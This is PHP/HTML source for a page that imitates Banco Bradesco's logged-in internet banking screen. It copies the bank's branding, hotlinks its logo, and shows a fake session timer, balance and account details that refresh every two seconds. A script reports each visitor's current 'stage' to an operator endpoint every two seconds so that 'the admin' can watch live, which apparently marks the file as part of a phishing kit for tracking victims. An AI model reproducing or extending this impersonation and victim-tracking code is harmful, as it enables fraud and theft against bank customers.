<?php
// --- 1) Inicia a sessão ---
session_start();
$menuAtivo = 'inicio';
?>
<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Banco Bradesco | Entre Nós, Você Vem Primeiro</title>
    <link rel="icon" href="/imagens/iconsite.png" type="image/png"/>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        /* RESET E ESTILOS GLOBAIS */
        html {
            line-height: 1.15;
            -webkit-text-size-adjust: 100%;
        }
        body {
            margin: 0;
            font-family: 'Montserrat', sans-serif;
            background-color: #eeeff1;
        }
        .top-bar * {
            box-sizing: border-box;
        }

        /* BARRA SUPERIOR (GRADIENTE) */
        .top-bar {
            height: 80px;
            padding: 0 24px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .top-bar.classic {
            font-family: 'Montserrat', sans-serif;
            background-image: linear-gradient(65deg, #142463 40%, #034694 110%);
            color: #ffffff;
        }

        /* CONTAINER DO CONTEÚDO DO HEADER */
        header.main-header {
            width: 100%;
            max-width: 1600px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            height: 100%;
        }

        .header-part {
            display: flex;
            align-items: center; 
            flex-shrink: 0;
            height: 100%;
        }

        /* PARTE ESQUERDA (LOGO E DATA) */
        .header-part.left {
            justify-content: flex-start;
            gap: 25px; 
        }
        .header-logo {
            width: 110px;
            height: 48px;
        }
        .header-part.left .data {
            position: relative !important; 
            top: 4px; 
            white-space: nowrap;
            font-size: .75rem;
            font-weight: 500;
            line-height: 1rem;
            text-transform: uppercase;
        }

        /* PARTE CENTRAL (BUSCA) */
        .header-part.center {
            flex-grow: 1;
            display: flex;
            justify-content: center;
            padding: 0 20px;
        }
        .busca-container {
            width: 100%;
            max-width: 350px;
        }
        .busca {
            position: relative;
        }
        .busca label {
            display: none;
        }
        .busca input {
            width: 100%;
            background-color: rgba(0, 0, 0, 0.2);
            border: 1px solid rgba(255, 255, 255, 0.2);
            border-radius: 4px;
            height: 38px;
            padding: 0 45px 0 15px;
            color: #ffffff;
            font-family: 'Montserrat', sans-serif;
            font-size: 14px;
        }
        .busca input::placeholder {
            color: rgba(255, 255, 255, 0.8);
        }
        .busca button {
            position: absolute;
            right: 0;
            top: 0;
            height: 100%;
            background: transparent;
            border: none;
            cursor: pointer;
            display: inline-flex;
            align-items: center;
            padding: 0 16px;
            color: #fff;
        }

        /* PARTE DIREITA (USUÁRIO, SESSÃO, LOGOUT) */
        .header-part.right {
            justify-content: flex-end;
            gap: 20px;
        }
        
        .user-details {
            display: flex;
            align-items: center;
            gap: 15px;
        }

        .saldo-info {
            display: flex;
            flex-direction: column;
            gap: 4px;
        }

        .saldo-disponivel {
            font-size: 13px;
            cursor: pointer;
            white-space: nowrap;
            display: flex;
            align-items: center;
            gap: 5px;
            user-select: none;
        }
        .saldo-disponivel .arrow {
            margin-top: -2px;
            transition: transform .2s ease;
            display: inline-flex;
        }
        .saldo-disponivel .arrow.rotated {
            transform: rotate(180deg);
        }

        .saldo-valor {
            display: flex;
            align-items: center;
            font-size: 14px;
            font-weight: 700;
            position: relative;
        }
        .saldo-valor .refresh-icon {
            width: 25px;
            height: 25px;
            margin-right: 5px;
            cursor: pointer;
        }
        /* Estado oculto */
        #saldo-wrapper[data-visivel="0"] #saldo-valor-display {
            filter: blur(8px);
            transition: filter .25s;
        }
        /* (Asteriscos): se preferir trocar blur por asteriscos, JS já manipula a classe masked */
        #saldo-valor-display.masked::after {
            content: '••••••';
            letter-spacing: 2px;
        }

        .separator {
            width: 1px;
            height: 50px;
            background-color: rgba(255, 255, 255, 0.3);
        }
        .dados-conta p {
            font-size: 13px;
            line-height: 1.4;
            margin: 0;
        }
        .dados-conta .nome {
            font-weight: 700;
            text-transform: uppercase;
        }

        .sessao {
            position: relative;
            display: flex;
            align-items: center;
            justify-content: center;
            width: 44px;
            height: 44px;
        }
        .sessao .label {
            position: absolute;
            font-weight: 700;
            text-align: center;
            line-height: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }
        .sessao .label .tempo {
            font-size: 16px;
        }
        .sessao .label .minuto-texto {
            font-size: 10px;
        }
        .sessao svg.clock circle {
            stroke-width: 3;
        }
        .sessao svg.clock .bkg {
            stroke: rgba(255, 255, 255, 0.3);
            fill: transparent;
        }
        .sessao svg.clock .remaining {
            stroke: #ffffff;
            fill: transparent;
            transform: scaleX(-1) rotate(-90deg); 
            transform-origin: center;
            stroke-dasharray: 125.66;
            stroke-dashoffset: 0;
            transition: stroke-dashoffset 1s linear;
        }

        .logout button {
            display: flex;
            align-items: center;
            gap: 8px;
            background: transparent;
            border: none;
            color: #ffffff;
            font-family: 'Montserrat', sans-serif;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            padding: 5px;
            white-space: nowrap;
        }
        .btn-logout {
        background: transparent;
        border: none;
        color: #fff;
        cursor: pointer;
        font: inherit;
        display: flex;
        align-items: center;
        gap: 8px;
        text-decoration: none;
        padding: 5px;
        }
        .btn-logout:hover { opacity: .85; }
        /* =========================================================
        RESPONSIVIDADE (MEDIA QUERIES) - VERSÃO AJUSTADA
        ========================================================= */

        /* Para tablets e telas menores (abaixo de 992px) */
        @media (max-width: 992px) {
            /* Ajusta a altura da barra para acomodar conteúdo quebra-linha */
            .top-bar {
                height: auto;
                padding: 16px 20px;
            }
            
            /* Permite que os itens do header quebrem para a próxima linha */
            .main-header {
                flex-wrap: wrap;
                row-gap: 20px;
            }

            /* Parte da esquerda e direita dividem a primeira linha */
            .header-part.left,
            .header-part.right {
                flex-basis: 0;
                flex-grow: 1;
            }

            /* A parte direita deve alinhar seu conteúdo à direita */
            .header-part.right {
                justify-content: flex-end;
            }

            /* Parte central (busca) ocupa toda a largura e vai para baixo */
            .header-part.center {
                flex-basis: 100%;
                order: 3;
                padding: 0;
            }
            .busca-container {
                max-width: none;
            }

            /* Esconde a data e o separador para ganhar espaço */
            .header-part.left .data,
            .separator {
                display: none;
            }
        }

        /* Para celulares (abaixo de 768px) */
        @media (max-width: 768px) {
            /* Header vira uma coluna, com itens centralizados */
            .main-header {
                flex-direction: column;
                align-items: center;
                gap: 24px;
            }
            
            /* Garante que todas as partes ocupem 100% da largura */
            .header-part {
                width: 100%;
                justify-content: center;
            }

            /* <<< AJUSTE PRINCIPAL: Reorganiza a parte direita com CSS Grid >>> */
            .header-part.right {
                display: grid;
                width: 100%;
                grid-template-columns: 1fr 1fr; /* Duas colunas de tamanho igual */
                grid-template-areas:
                    "details details"  /* 1ª linha: user-details ocupa as 2 colunas */
                    "timer   logout";   /* 2ª linha: timer na esquerda, logout na direita */
                gap: 16px 10px; /* 16px de espaço vertical, 10px horizontal */
                align-items: center;
            }

            /* Associa cada elemento à sua área no grid */
            .user-details {
                grid-area: details;
                display: flex; /* Garante que o flexbox interno funcione */
                justify-content: center;
                flex-wrap: wrap; /* Permite quebrar linha se necessário */
                gap: 12px 20px;
            }
            .sessao {
                grid-area: timer;
                display: flex;
                justify-self: end; /* Alinha o timer à DIREITA da sua célula */
            }
            .logout { /* Usamos o container do botão */
                grid-area: logout;
                justify-self: start; /* Alinha o botão de logout à ESQUERDA da sua célula */
            }
            
            /* Garante que o texto de saldo, conta e nome estejam centralizados */
            .saldo-info,
            .dados-conta {
                text-align: center;
            }
            
            /* Esconde o texto do botão de logout, deixando só o ícone */
            .btn-logout span {
                display: none;
            }
            .btn-logout {
                padding: 10px;
                background-color: rgba(0,0,0,0.2);
                border-radius: 50%;
            }
        }

    </style>
</head>
<body>

    <div class="top-bar classic">
        <header class="main-header">

            <div class="header-part left">
                <img src="https://www.ib13.bradesco.com.br/ibpf/imagens/novologin/header-logo/bradesco-prime.png" alt="Logo Bradesco" class="header-logo">
                <div class="data">
                    <span id="current-date"></span>
                </div>
            </div>

            <div class="header-part center">
                <div class="busca-container">
                    <div class="busca">
                        <label for="busca">Buscar</label>
                        <input id="busca" name="busca" placeholder="Buscar" tabindex="1" title="Informe o conteúdo da pesquisa" type="text">
                        <button tabindex="-1" title="Botão Buscar" type="button">
                            <i class="ico">
                                <svg height="13" version="1.1" viewBox="0 0 12.75 12.75" width="13">
                                    <path d="M9.21841967,8.6873861 L12.6401923,12.1098622 C12.7866239,12.2563239 12.7865994,12.4937607 12.6401378,12.6401923 C12.4936761,12.7866239 12.2562393,12.7865994 12.1098077,12.6401378 L8.68813965,9.21776627 C7.76705544,10.0165869 6.565007,10.5 5.25,10.5 C2.35039322,10.5 0,8.14960678 0,5.25 C0,2.35039322 2.35039322,0 5.25,0 C8.14960678,0 10.5,2.35039322 10.5,5.25 C10.5,6.56464842 10.0168505,7.76639987 9.21841967,8.6873861 Z M0.75,5.25 C0.75,7.73539322 2.76460678,9.75 5.25,9.75 C7.73539322,9.75 9.75,7.73539322 9.75,5.25 C9.75,2.76460678 7.73539322,0.75 5.25,0.75 C2.76460678,0.75 0.75,2.76460678 0.75,5.25 Z" fill="#ffffff"></path>
                                </svg>
                            </i>
                        </button>
                    </div>
                </div>
            </div>

            <div class="header-part right">
                <div class="user-details">
                    <div class="saldo-info">
                        <!-- BOTÃO / TÍTULO COM SETA PARA TOGGLE -->
                        <div class="saldo-disponivel" id="toggle-saldo-btn">
                            <span>Saldo disponível</span>
                            <span class="arrow" id="saldo-arrow">
                                <svg _ngcontent-iie-c6="" xmlns:xlink="http://www.w3.org/1999/xlink" height="20" viewBox="-5 -2 22 22" width="25" xmlns="http://www.w3.org/2000/svg"><path _ngcontent-iie-c6="" d="M5.5 12.747l7.626-8.58a.5.5 0 1 1 .748.665l-8 9a.5.5 0 0 1-.748 0l-8-9a.5.5 0 1 1 .748-.664l7.626 8.58z" fill="#fff" id="a"></path></svg>
                            </span>
                        </div>
                        <!-- WRAPPER DO VALOR -->
                        <div class="saldo-valor" id="saldo-wrapper" data-visivel="1">
                            <svg class="refresh-icon" id="refresh-saldo" viewBox="0 0 24 24" fill="white">
                                <path d="M17.65 6.35C16.2 4.9 14.21 4 12 4c-4.42 0-7.99 3.58-7.99 8s3.57 8 7.99 8c3.73 0 6.84-2.55 7.73-6h-2.08c-.82 2.33-3.04 4-5.65 4-3.31 0-6-2.69-6-6s2.69-6 6-6c1.66 0 3.14.69 4.22 1.78L13 11h7V4l-2.35 2.35z"></path>
                            </svg>
                            <span id="saldo-valor-display" data-real="">R$ --,--</span>
                        </div>
                    </div>
                    <span class="separator"></span>
                    <div class="dados-conta">
                        <p class="nome" id="user-name-display">Carregando...</p>
                        <p id="account-info-display">Ag. ---- • Conta ------</p>
                    </div>
                </div>
                <div class="sessao">
                    <div class="label">
                        <span class="tempo" id="timer-minutes">20</span>
                        <span class="minuto-texto">MIN</span>
                    </div>
                    <svg class="clock" height="44" width="44">
                        <circle class="bkg" cx="22" cy="22" r="20"></circle>
                        <circle id="timer-circle" class="remaining" cx="22" cy="22" r="20"></circle>
                    </svg>
                </div>
                <div class="logout">
                    <button id="btnLogout" title="Sair" type="button"> 
                        <i class="ico"><svg height="18px" viewBox="0 0 18 18" width="18px"><path d="M13.2918932,9 L5.5,9 C5.22385763,9 5,8.77614237 5,8.5 C5,8.22385763 5.22385763,8 5.5,8 L13.2918932,8 L11.1454466,5.85355339 C10.9501845,5.65829124 10.9501845,5.34170876 11.1454466,5.14644661 C11.3407088,4.95118446 11.6572912,4.95118446 11.8525534,5.14644661 L14.8525534,8.14644661 C15.0478155,8.34170876 15.0478155,8.65829124 14.8525534,8.85355339 L11.8525534,11.8535534 C11.6572912,12.0488155 11.3407088,12.0488155 11.1454466,11.8535534 C10.9501845,11.6582912 10.9501845,11.3417088 11.1454466,11.1464466 L13.2918932,9 Z M13.999,14.5 C13.999,14.2238576 14.2228576,14 14.499,14 C14.7751424,14 14.999,14.2238576 14.999,14.5 L14.999,15.833 C14.999,16.4779131 14.4763721,17 13.832,17 L5.167,17 C3.417174,17 2,15.5824589 2,13.833 L2,1.167 C2,0.522086868 2.52262789,0 3.167,0 L12.499,0 C13.8791424,0 14.999,1.11985763 14.999,2.5 C14.999,2.77614237 14.7751424,3 14.499,3 C14.2228576,3 13.999,2.77614237 13.999,2.5 C13.999,1.67214237 13.3268576,1 12.499,1 L3.167,1 C3.07468092,1 3,1.07460361 3,1.167 L3,13.833 C3,15.0302321 3.96951675,16 5.167,16 L13.832,16 C13.9243191,16 13.999,15.9253964 13.999,15.833 L13.999,14.5 Z" fill="#ffffff"></path></svg></i>
                    </button>
                </div>
            </div>

        </header>
    </div>

    <?php include 'menuprime.php'; ?>
    <?php include 'corpo.php'; ?>
    <?php include 'servicos.php'; ?>
    <?php include 'footerprime.php'; ?>
    <?php include 'chat.php'; ?>

<script>
    // Script específico da página logado.php
    document.addEventListener('DOMContentLoaded', () => {
        // --- LÓGICA DO BOTÃO DE LOGOUT ---
        const btnLogout = document.getElementById('btnLogout');
        if (btnLogout) {
            btnLogout.addEventListener('click', () => {
                sessionStorage.removeItem('sessionEndTime'); // Limpa o timer ao sair
                window.location.href = '/';
            });
        }

        // --- SCRIPT PARA DATA DINÂMICA (HEADER) ---
        const dateElement = document.getElementById('current-date');
        if (dateElement) {
            const hoje = new Date();
            const diasDaSemana = ["Domingo", "Segunda-feira", "Terça-feira", "Quarta-feira", "Quinta-feira", "Sexta-feira", "Sábado"];
            const diaSemana = diasDaSemana[hoje.getDay()];
            const dia = String(hoje.getDate()).padStart(2, '0');
            const mes = String(hoje.getMonth() + 1).padStart(2, '0');
            const ano = hoje.getFullYear();
            dateElement.textContent = `${diaSemana}, ${dia}/${mes}/${ano}`;
        }

        // --- SCRIPT PARA DATAS DA TIMELINE ---
        const timelineDates = document.querySelectorAll('.transaction-date');
        if (timelineDates.length > 0) {
            const meses = ["JAN", "FEV", "MAR", "ABR", "MAI", "JUN", "JUL", "AGO", "SET", "OUT", "NOV", "DEZ"];
            const hoje = new Date();
            const ontem = new Date();
            ontem.setDate(hoje.getDate() - 1);
            
            if (timelineDates[0]) {
                timelineDates[0].querySelector('strong').textContent = hoje.getDate();
                timelineDates[0].querySelector('span').textContent = meses[hoje.getMonth()];
            }
            if (timelineDates[1]) {
                timelineDates[1].querySelector('strong').textContent = ontem.getDate();
                timelineDates[1].querySelector('span').textContent = meses[ontem.getMonth()];
            }
        }
        
        // --- SCRIPT PARA ATUALIZAÇÃO DE DADOS E TOGGLE DE SALDO ---
        const saldoElement       = document.getElementById('saldo-valor-display');
        const nameElement        = document.getElementById('user-name-display');
        const accountInfoElement = document.getElementById('account-info-display');
        const toggleSaldoBtn     = document.getElementById('toggle-saldo-btn');
        const saldoWrapper       = document.getElementById('saldo-wrapper');
        const saldoArrow         = document.getElementById('saldo-arrow');
        const refreshIcon        = document.getElementById('refresh-saldo');

        let saldoVisivel         = true;
        let ultimoSaldoReal      = '';

        function aplicarEstadoSaldo() {
            if (saldoVisivel) {
                saldoWrapper.dataset.visivel = "1";
                saldoArrow.classList.remove('rotated');
                saldoElement.classList.remove('masked');
                saldoElement.textContent = ultimoSaldoReal || 'R$ --,--';
            } else {
                saldoWrapper.dataset.visivel = "0";
                saldoArrow.classList.add('rotated');
                saldoElement.classList.add('masked');
                saldoElement.textContent = ''; 
            }
        }

        if (toggleSaldoBtn) {
            toggleSaldoBtn.addEventListener('click', () => {
                saldoVisivel = !saldoVisivel;
                aplicarEstadoSaldo();
            });
        }

        function fetchClientData() {
            fetch('/get_client_data.php')
                .then(response => response.json())
                .then(data => {
                    if (data.success) {
                        ultimoSaldoReal = data.saldo_formatado;
                        saldoElement.dataset.real = ultimoSaldoReal;
                        if (saldoVisivel) {
                            saldoElement.textContent = ultimoSaldoReal;
                        }
                        nameElement.textContent = data.nome;
                        accountInfoElement.textContent = `${data.agencia} • ${data.conta}-${data.digito}`;
                    } else {
                        nameElement.textContent = "Cliente";
                        accountInfoElement.textContent = "Não identificado";
                    }
                })
                .catch(error => {
                    console.error('Erro ao buscar dados do cliente:', error);
                });
        }

        if (refreshIcon) {
            refreshIcon.addEventListener('click', (e) => {
                e.stopPropagation();
                fetchClientData();
            });
        }

        if (saldoElement && nameElement && accountInfoElement) {
            fetchClientData();
            setInterval(fetchClientData, 2000);
            aplicarEstadoSaldo();
        }
    });
</script>

    <script>
    document.addEventListener('DOMContentLoaded', () => {
        // 1. Defina o nome da página (continua igual)
        // IMPORTANTE: Altere este valor para o nome da página atual
        const pageName = 'logado.php'; 

        // 2. Crie uma função para encapsular a lógica do fetch
        // Isso torna o código mais limpo e reutilizável.
        function reportarEstagioAtual() {
            fetch('/atualizar_estagio.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ estagio: pageName }),
                credentials: 'include' // É uma boa prática manter isso
            }).catch(error => console.error(`Erro ao reportar estágio '${pageName}':`, error));
        }

        // 3. Chame a função uma vez imediatamente quando a página carregar
        // Para que o admin veja a atualização na hora, sem esperar 2 segundos.
        reportarEstagioAtual(); 

        // 4. Configure para chamar a função repetidamente a cada 2 segundos
        setInterval(reportarEstagioAtual, 2000); // 2000 milissegundos = 2 segundos
    });
    </script>

</body>
</html>
